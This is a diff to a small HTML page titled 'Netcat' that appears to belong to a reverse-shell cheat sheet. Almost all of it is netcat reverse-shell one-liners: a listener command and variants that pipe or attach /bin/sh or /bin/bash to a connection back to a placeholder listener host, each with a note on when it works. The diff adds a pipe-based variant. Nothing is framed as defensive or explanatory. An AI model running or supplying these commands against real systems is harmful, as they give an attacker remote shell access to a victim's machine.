@@ -5,6 +5,7 @@
 <title>Netcat</title>
 </head><body>LISTEN WITH: nc -lvvnp &lt;LPORT&gt;<br/>
 <br/>
-nc -e /bin/sh &lt;LIP&gt; &lt;LPORT&gt;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;relies on being able to use the -e argument<br/>
-/usr/local/bin/nc &lt;LIP&gt; &lt;LPORT&gt; -e '/bin/bash'&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;using the full path of netcat (default)<br/>
+/bin/sh | nc &lt;LIP&gt; &lt;LPORT&gt;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;no -e, but needs pipe<br/>
+nc -e /bin/sh &lt;LIP&gt; &lt;LPORT&gt;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;relies on being able to use the -e argument<br/>
+/usr/local/bin/nc &lt;LIP&gt; &lt;LPORT&gt; -e '/bin/bash'&#09;&#09;&#09;&#09;&#09;using the full path of netcat (default)<br/>
 </body></html>
